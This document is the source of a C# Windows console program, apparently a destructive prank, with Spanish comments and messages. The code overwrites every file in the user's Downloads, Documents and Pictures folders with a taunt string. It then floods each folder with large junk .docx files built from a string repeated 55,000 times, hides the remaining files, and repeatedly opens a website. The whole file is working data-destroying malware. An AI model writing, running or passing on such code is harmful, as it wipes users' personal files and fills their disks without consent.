using System;
using System.Diagnostics;
using System.IO;

namespace ConsoleApplication1
{
    class Program
    {
        static void Main()
        {

            DirectoryInfo direccion;

            string aux = "", texto = @"¡Fuiste avisado! ¯\_(ツ)_/¯";

            string rutaPrincipal = "";

           // DirectoryInfo direccion = new DirectoryInfo(@"D:\Cole 2019\UNDERTALE");

            //string rutaPrincipal = @"D:\Cole 2019\UNDERTALE";

            string rutaCompleta;

            int cont=0, ubicacion=0;

            bool unaVez = true, entra = true, hacer=true;

            do {

                ubicacion += 1;

                cont = 0;

                Process p = new Process();
                ProcessStartInfo psi = new ProcessStartInfo("https://cat-bounce.com/");
                p.StartInfo = psi;
                p.Start();

                switch (ubicacion)
                {

                    case 1:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Downloads");

                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Downloads";

                        break;

                    case 2:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Documents");

                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Documents";

                        break;


                    case 3:

                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Pictures");

                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Pictures";

                        break;

                    default:
                        direccion = new DirectoryInfo(@"C:\Users\" + Environment.UserName + @"\Downloads");

                        rutaPrincipal = @"C:\Users\" + Environment.UserName + @"\Downloads";
                        break;
                }

                do
                {

                    Console.Clear();

                    Console.WriteLine("Ejecutando...");

                    cont++;

                    rutaCompleta = rutaPrincipal + @"\te_lo_dije" + cont + ".docx";

                    if (entra == true)
                    {

                        if (direccion.GetFiles().Length == 0)
                        {

                            aux = texto;

                        }
                        else
                        {

                            foreach (FileInfo file in direccion.GetFiles())
                            {
                                if (unaVez == true)
                                {

                                    aux = File.ReadAllText(file.FullName); //aux guarda los valores originales.

                                    unaVez = false;

                                }

                                try
                                {
                                    
                                    File.WriteAllText(file.FullName, texto);

                                }
                                catch
                                {

                                    entra = false;

                                }
                                

                            }

                        }

                        entra = false;

                    }

                    using (StreamWriter archivo = File.AppendText(rutaCompleta))         //se crea el archivo
                    {

                        for (int i = 0; i < 55000; i++)
                        {

                            archivo.Write(aux);

                        }

                        archivo.Close();

                    }

                } while (cont <= 12);

                foreach (FileInfo file in direccion.GetFiles())
                {

                    File.SetAttributes(file.FullName, FileAttributes.Hidden);

                }

            } while (ubicacion<=3);


        }
    }
}